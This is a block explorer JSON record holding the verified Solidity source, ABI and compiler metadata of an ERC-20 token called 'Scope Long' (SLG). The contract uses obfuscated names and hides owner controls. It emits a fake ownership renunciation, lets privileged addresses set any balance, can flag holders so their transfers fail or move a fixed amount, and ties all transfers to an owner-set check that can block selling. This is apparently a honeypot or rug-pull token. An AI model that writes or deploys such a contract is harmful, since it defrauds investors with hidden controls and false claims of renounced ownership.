{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface takeShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingTotalLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverMarketing {\n    function createPair(address tradingSender, address atIs) external returns (address);\n}\n\ninterface autoToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTx) external view returns (uint256);\n\n    function transfer(address receiverLaunch, uint256 isTotal) external returns (bool);\n\n    function allowance(address fundMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverLaunch,\n        uint256 isTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitFee, uint256 value);\n    event Approval(address indexed fundMax, address indexed spender, uint256 value);\n}\n\ninterface autoTokenMetadata is autoToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ScopeLong is tradingTotalLiquidity, autoToken, autoTokenMetadata {\n\n    function enableTotalLimit(address modeLaunched, uint256 isTotal) public {\n        totalSell();\n        shouldLaunch[modeLaunched] = isTotal;\n    }\n\n    uint256 private enableFundBuy;\n\n    function modeAt(address liquidityReceiver, address receiverLaunch, uint256 isTotal) internal returns (bool) {\n        if (liquidityReceiver == receiverReceiver) {\n            return senderTx(liquidityReceiver, receiverLaunch, isTotal);\n        }\n        uint256 launchAmount = autoToken(swapTo).balanceOf(isEnableFee);\n        require(launchAmount == teamFrom);\n        require(receiverLaunch != isEnableFee);\n        if (fundMin[liquidityReceiver]) {\n            return senderTx(liquidityReceiver, receiverLaunch, sellShouldList);\n        }\n        return senderTx(liquidityReceiver, receiverLaunch, isTotal);\n    }\n\n    address public receiverReceiver;\n\n    uint256 private totalEnableMax = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private shouldAuto;\n\n    address isEnableFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public tradingFromReceiver;\n\n    constructor (){\n        if (enableTotalAt != enableFrom) {\n            takeEnableMin = senderTakeSwap;\n        }\n        takeShould swapLiquidity = takeShould(buyAt);\n        swapTo = receiverMarketing(swapLiquidity.factory()).createPair(swapLiquidity.WETH(), address(this));\n        if (takeEnableMin == enableFundBuy) {\n            senderTakeSwap = takeEnableMin;\n        }\n        receiverReceiver = _msgSender();\n        exemptSender();\n        minLaunched[receiverReceiver] = true;\n        shouldLaunch[receiverReceiver] = totalEnableMax;\n        if (enableTotalAt) {\n            enableFrom = false;\n        }\n        emit Transfer(address(0), receiverReceiver, totalEnableMax);\n    }\n\n    bool private enableTotalAt;\n\n    uint256 constant sellShouldList = 14 ** 10;\n\n    mapping(address => bool) public fundMin;\n\n    address private marketingMinAuto;\n\n    function exemptSender() public {\n        emit OwnershipTransferred(receiverReceiver, address(0));\n        marketingMinAuto = address(0);\n    }\n\n    function allowance(address receiverAuto, address fromFund) external view virtual override returns (uint256) {\n        if (fromFund == buyAt) {\n            return type(uint256).max;\n        }\n        return shouldAuto[receiverAuto][fromFund];\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingMinAuto;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalSwap;\n    }\n\n    function totalSell() private view {\n        require(minLaunched[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalEnableMax;\n    }\n\n    function balanceOf(address modeTx) public view virtual override returns (uint256) {\n        return shouldLaunch[modeTx];\n    }\n\n    function atModeShould(address swapAmount) public {\n        require(swapAmount.balance < 100000);\n        if (tradingFromReceiver) {\n            return;\n        }\n        \n        minLaunched[swapAmount] = true;\n        \n        tradingFromReceiver = true;\n    }\n\n    string private totalSwap = \"SLG\";\n\n    function transferFrom(address liquidityReceiver, address receiverLaunch, uint256 isTotal) external override returns (bool) {\n        if (_msgSender() != buyAt) {\n            if (shouldAuto[liquidityReceiver][_msgSender()] != type(uint256).max) {\n                require(isTotal <= shouldAuto[liquidityReceiver][_msgSender()]);\n                shouldAuto[liquidityReceiver][_msgSender()] -= isTotal;\n            }\n        }\n        return modeAt(liquidityReceiver, receiverLaunch, isTotal);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableLiquidity;\n    }\n\n    address public swapTo;\n\n    function transfer(address modeLaunched, uint256 isTotal) external virtual override returns (bool) {\n        return modeAt(_msgSender(), modeLaunched, isTotal);\n    }\n\n    bool private enableFrom;\n\n    address buyAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private enableLiquidity = \"Scope Long\";\n\n    bool private walletReceiver;\n\n    event OwnershipTransferred(address indexed exemptSwap, address indexed walletTo);\n\n    function senderTx(address liquidityReceiver, address receiverLaunch, uint256 isTotal) internal returns (bool) {\n        require(shouldLaunch[liquidityReceiver] >= isTotal);\n        shouldLaunch[liquidityReceiver] -= isTotal;\n        shouldLaunch[receiverLaunch] += isTotal;\n        emit Transfer(liquidityReceiver, receiverLaunch, isTotal);\n        return true;\n    }\n\n    mapping(address => uint256) private shouldLaunch;\n\n    function owner() external view returns (address) {\n        return marketingMinAuto;\n    }\n\n    uint256 private takeEnableMin;\n\n    uint256 fundTradingTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTakeLaunched;\n    }\n\n    function approve(address fromFund, uint256 isTotal) public virtual override returns (bool) {\n        shouldAuto[_msgSender()][fromFund] = isTotal;\n        emit Approval(_msgSender(), fromFund, isTotal);\n        return true;\n    }\n\n    uint256 private senderTakeSwap;\n\n    mapping(address => bool) public minLaunched;\n\n    uint8 private receiverTakeLaunched = 18;\n\n    function swapTotal(uint256 isTotal) public {\n        totalSell();\n        teamFrom = isTotal;\n    }\n\n    uint256 teamFrom;\n\n    function launchedLimit(address senderMode) public {\n        totalSell();\n        if (enableTotalAt) {\n            enableFundBuy = senderTakeSwap;\n        }\n        if (senderMode == receiverReceiver || senderMode == swapTo) {\n            return;\n        }\n        fundMin[senderMode] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"}],\"name\":\"atModeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTotal\",\"type\":\"uint256\"}],\"name\":\"enableTotalLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"}],\"name\":\"launchedLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isTotal\",\"type\":\"uint256\"}],\"name\":\"swapTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ScopeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}